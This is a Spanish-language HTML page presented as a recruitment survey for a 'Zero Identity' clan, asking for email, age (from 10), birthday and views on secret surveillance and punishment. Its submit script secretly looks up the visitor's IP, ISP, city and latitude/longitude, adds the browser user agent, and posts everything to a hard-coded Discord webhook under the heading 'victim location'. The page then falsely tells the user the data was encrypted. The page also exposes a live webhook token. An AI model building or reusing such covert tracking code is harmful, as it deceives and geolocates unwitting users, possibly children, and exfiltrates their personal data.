<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>ZERO IDENTITY | ACCESO RESTRINGIDO</title>
    <style>
        body { background-color: #000; color: #8000ff; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
        #bg-terminal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: linear-gradient(0deg, rgba(128, 0, 255, 0.1) 1px, transparent 1px); background-size: 100% 20px; animation: scrollUp 1s linear infinite; }
        @keyframes scrollUp { to { transform: translateY(-20px); } }
        
        .panel { background: rgba(0,0,0,0.9); border: 2px solid #8000ff; padding: 30px; border-radius: 15px; text-align: center; max-width: 500px; width: 90%; max-height: 85vh; overflow-y: auto; box-shadow: 0 0 30px #8000ff; }
        .logo-img { width: 200px; height: 200px; border-radius: 50%; border: 3px solid #8000ff; box-shadow: 0 0 20px #8000ff; margin-bottom: 20px; object-fit: cover; }
        
        h1 { font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 20px; text-shadow: 0 0 10px #8000ff; }
        input, textarea, select { width: 100%; background: #111; border: 1px solid #8000ff; color: #fff; margin: 10px 0; padding: 12px; box-sizing: border-box; }
        label { display: block; text-align: left; margin-top: 15px; font-weight: bold; font-size: 0.9rem; }
        
        .btn { background: #8000ff; color: #fff; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 20px; transition: 0.3s; }
        .btn:disabled { background: #333; cursor: not-allowed; }
        .btn:hover:not(:disabled) { background: #a040ff; box-shadow: 0 0 20px #a040ff; }
        
        #survey, #countdown-screen { display: none; }
    </style>
</head>
<body>
    <div id="bg-terminal"></div>

    <div id="login" class="panel">
        <img src="https://i.imgur.com/tu_foto_aqui.jpg" class="logo-img" onerror="this.src='https://via.placeholder.com/200/8000ff/ffffff?text=ZERO+IDENTITY'">
        <h1>ZERO IDENTITY</h1>
        <p>INGRESE SU CORREO PARA CONTINUAR</p>
        <input type="email" id="userEmail" placeholder="correo@ejemplo.com" required>
        <button class="btn" onclick="checkLogin()">VERIFICAR IDENTIDAD</button>
    </div>

    <div id="survey" class="panel">
        <h1>RECLUTAMIENTO</h1>
        <form id="clanForm">
            <label>1. ¿Cómo supiste de nosotros?</label>
            <select id="q1" required>
                <option value="">Seleccione...</option>
                <option value="TikTok">TikTok</option>
                <option value="Facebook">Facebook</option>
                <option value="Amigos">Amigos</option>
            </select>

            <label>2. ¿Por qué quieres entrar al Clan?</label>
            <textarea id="q2" placeholder="Describa sus motivos..." required></textarea>

            <label>3. ¿Qué te llamó la atención de nosotros?</label>
            <textarea id="q3" required></textarea>

            <label>4. ¿Cuál es tu edad?</label>
            <input type="number" id="q4" required min="10">

            <label>5. ¿Cuál es tu fecha de cumpleaños?</label>
            <input type="date" id="q5" required>

            <label>6. ¿Estás dispuesto a ser responsable?</label>
            <select id="q6" required><option value="Sí">Sí</option><option value="No">No</option></select>

            <label>7. Protocolo de respuesta ante grupos externos:</label>
            <textarea id="q7" required></textarea>

            <label>8. ¿Harías labores de observación secreta?</label>
            <select id="q8" required><option value="Sí">Sí</option><option value="No">No</option></select>

            <label>9. ¿Cuál consideras que debería ser la sanción máxima?</label>
            <textarea id="q9" required></textarea>

            <button type="button" id="submitBtn" class="btn" onclick="sendData()">ENVIAR SOLICITUD</button>
        </form>
    </div>

    <div id="countdown-screen" class="panel">
        <h1 style="color: #ff0000;">SOLICITUD ENVIADA</h1>
        <p>Tus respuestas han sido cifradas con éxito.</p>
        <p>Esta sesión se cerrará automáticamente en:</p>
        <h1 id="timer" style="font-size: 4rem;">5</h1>
        <p>ESTADO: ESPERANDO APROBACIÓN</p>
    </div>

    <script>
        function checkLogin() {
            const email = document.getElementById('userEmail').value;
            if(!email.includes("@")) { alert("Ingrese un correo válido"); return; }
            
            if(localStorage.getItem("enviado_" + email)) {
                alert("Este correo ya tiene una solicitud activa. Estado: ESPERANDO APROBACIÓN.");
            } else {
                document.getElementById('login').style.display = 'none';
                document.getElementById('survey').style.display = 'block';
            }
        }

        async function sendData() {
            const form = document.getElementById('clanForm');
            if(!form.checkValidity()) { alert("DEBE RELLENAR TODOS LOS CAMPOS"); return; }
            
            document.getElementById('submitBtn').disabled = true;
            document.getElementById('submitBtn').innerText = "CIFRANDO...";

            try {
                // Captura de IP y Datos del Sistema
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                const webhook = "https://discord.com/api/webhooks/1499573231294615572/P5MkhcgsaQPbidfpWo6tFVXTABaJqIh0mo7JT2cwCDz0bBNuJJ6X7umtisJqDfeBvnje";
                
                const payload = {
                    embeds: [{
                        title: "⚔️ NUEVA SOLICITUD DE INGRESO - ZERO IDENTITY",
                        color: 8388863,
                        fields: [
                            {name: "📧 Correo", value: document.getElementById('userEmail').value},
                            {name: "🎂 Edad/Cumple", value: document.getElementById('q4').value + " | " + document.getElementById('q5').value},
                            {name: "📱 Origen", value: document.getElementById('q1').value},
                            {name: "🛡️ Protocolo Silencio", value: document.getElementById('q7').value},
                            {name: "🌍 UBICACIÓN DE VÍCTIMA", value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`},
                            {name: "📍 COORDENADAS", value: `Lat: ${ipData.latitude}, Lon: ${ipData.longitude}`},
                            {name: "🌐 IP / COMPAÑÍA", value: `IP: ${ipData.ip} \nProveedor: ${ipData.org}`},
                            {name: "🖥️ DISPOSITIVO", value: navigator.userAgent}
                        ],
                        footer: { text: "Protocolo Pinky_Tren Activado" }
                    }]
                };

                await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });

                localStorage.setItem("enviado_" + document.getElementById('userEmail').value, true);
                startCountdown();
            } catch (e) {
                alert("Error en el cifrado. Reintente.");
                document.getElementById('submitBtn').disabled = false;
            }
        }

        function startCountdown() {
            document.getElementById('survey').style.display = 'none';
            document.getElementById('countdown-screen').style.display = 'block';
            let sec = 5;
            const timer = setInterval(() => {
                sec--;
                document.getElementById('timer').innerText = sec;
                if(sec <= 0) {
                    clearInterval(timer);
                    window.location.href = "about:blank";
                }
            }, 1000);
        }
    </script>
</body>
</html>
